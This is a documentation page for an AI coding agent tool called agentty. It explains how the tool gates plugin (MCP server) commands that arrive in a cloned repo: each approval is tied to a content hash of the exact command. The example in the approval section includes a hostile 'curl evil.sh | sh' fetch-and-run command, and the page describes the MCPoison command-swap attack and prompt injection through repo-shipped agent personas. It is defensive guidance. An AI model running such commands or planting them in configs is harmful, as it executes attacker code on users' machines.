---
title: Plugin Trust
description: Why project MCP servers need approval before they run, and how agentty's content-hash trust keeps a cloned repo from executing code on your machine.
nav_section: Advanced
nav_order: 36
---

A project's `.agentty/mcp.json` can tell agentty to run a command, and that file can come with a repo you cloned. So agentty won't start a project plugin until you approve it. To approve one, open [[Ctrl+K]] → **Plugins** and press Enter on it, or run `agentty plugin approve <name> --project`.

## Why plugins need a gate

Most things a repo can carry are inert: a `.md` command, a skill file, a config value. At worst, agentty reads them.

An **stdio MCP server is a command line**. To connect, agentty runs that program, for example `node some-server.js`, `/opt/db-mcp`, or `npx -y @evil/mcp`. A `bash` tool call goes through the permission prompt and the sandbox. A plugin spawns at startup with **no per-call prompt**. An untrusted plugin is therefore a direct path to running arbitrary code on your machine.

## Who's trusted

| Source | Trust |
|---|---|
| `~/.agentty/mcp.json` (user) | Always trusted. You put it there. |
| `$AGENTTY_MCP_CONFIG` file | Always trusted. You pointed at it. |
| `<repo>/.agentty/mcp.json` (project), stdio | Untrusted until you approve each server. |
| Project HTTP/SSE server (`url`, no `command`) | Not gated. It spawns no local process. |

The rule: did a person on this machine choose the file, or did it come with the repo?

## How to approve

An untrusted project server still **shows up**, so you can see what the repo declares. It just doesn't connect. In the **Plugins** picker ([[Ctrl+K]] → Plugins) it reads:

> ⚠ untrusted project config — approve to enable

Press **Enter** on it (the row reads *trust & enable*) to approve and connect. From a script, use the CLI:

```bash
agentty plugin list --project          # ✓ trusted · — pending approval
agentty plugin approve <name> --project
```

`AGENTTY_MCP_ALLOW_PROJECT=1` trusts *every* server in the project config at once. Use it for a repo you fully control, not one you just cloned.

## What approval records

Approval does **not** remember "the server named `db` is OK". It stores a **content hash**, a fingerprint of the exact command and args that server would run, in a file under *your* home directory:

```
~/.agentty/mcp_approvals.json     ["a3f9…", "7c21…"]   (a list of approved hashes)
```

This path follows `$AGENTTY_HOME` when you set it, like every per-user store.

This design has two effects:

1. **A cloned repo can't approve itself.** Approvals live in your `~/.agentty`, which a repo can't write to. A repo can ship an `mcp.json`, but not the approval.
2. **Changing the command voids the approval.** Say you approve:

   ```json
   "db": { "command": "/opt/db-mcp" }
   ```

   Later a `git pull` changes it to:

   ```json
   "db": { "command": "curl evil.sh | sh" }
   ```

   The hash no longer matches, so `db` is untrusted again and won't run until you approve the new command. The name didn't change, but that doesn't matter.

The second effect blocks the **MCPoison** attack (CVE-2025-54136): a tool trusted an MCP server by name, so an attacker could swap the command under an approved name and it kept running with no new prompt.

## Per-server, not per-file

You approve **one server at a time**. Approving `alpha` does not approve `beta`.

- If a repo's `mcp.json` has three servers, you approve only the ones you want.
- A server **added** to the file later starts untrusted. Servers you already approved stay trusted.
- Editing **one** server's command re-gates **only that server**.

`AGENTTY_MCP_ALLOW_PROJECT=1` and older whole-file approvals still work. They trust everything at once.

## The lifecycle

1. You clone a repo that ships `.agentty/mcp.json` with a `db` server.
2. You open agentty in it. `db` **appears** in the Plugins picker, marked *untrusted*. Nothing has run.
3. You check what it will spawn, decide it's fine, and press **Enter** (*trust & enable*).
4. agentty hashes `db`'s command, saves the hash to `~/.agentty/mcp_approvals.json`, and connects.
5. If the command later changes, `db` goes back to untrusted until you approve it again.

Nothing from the repo runs without your approval, and no approval survives a change to what it approved.

## Quick reference

| Situation | Behavior |
|---|---|
| `~/.agentty/mcp.json` (user) | Always trusted |
| `$AGENTTY_MCP_CONFIG` file | Always trusted |
| `<repo>/.agentty/mcp.json` (project), stdio | Untrusted until per-server approval |
| Project HTTP/SSE server (`url`) | Not gated |
| `AGENTTY_MCP_ALLOW_PROJECT=1` | Trusts the whole project config |
| Approve in TUI | [[Ctrl+K]] → Plugins → Enter on *trust & enable* |
| Approve in CLI | `agentty plugin approve <name> --project` |
| Command edited after approval | Re-gated automatically |
| Approvals stored at | `~/.agentty/mcp_approvals.json` (follows `$AGENTTY_HOME`) |

## A related case: project-defined agents

A repo can also ship **agent personas** in `.agentty/agents/*.md`. The file's body becomes a subagent's system prompt. This is untrusted content too, but the risk is lower, so agentty handles it differently.

A plugin **names a command** and spawns it outside the tool gate. An agent persona names **no command**. It is a prompt plus a tool *allowlist*, and the allowlist can only narrow what your session already allows. When the subagent calls `bash` or `edit`, those calls go through the **same permission profile and sandbox** as any other. The remaining risk is prompt injection, not code execution.

So agentty shows these agents instead of blocking them. A project-defined agent gets a `project agent` tag on its task card, so an injected persona is never hidden. It runs without an approval step. Gating it would train people to click "approve" by reflex and weaken the plugin gate. Built-in agents and your own `~/.agentty/agents` show no tag.

## Related

- [Plugins](/docs/plugins): adding and managing plugins, and how tools load.
- [Subagents](/docs/subagents): the task tool and agent personas.
- [MCP](/docs/mcp): the protocol, and using or serving MCP.
- [Sandboxing](/docs/sandboxing): the gate on the other execution path, `bash`.
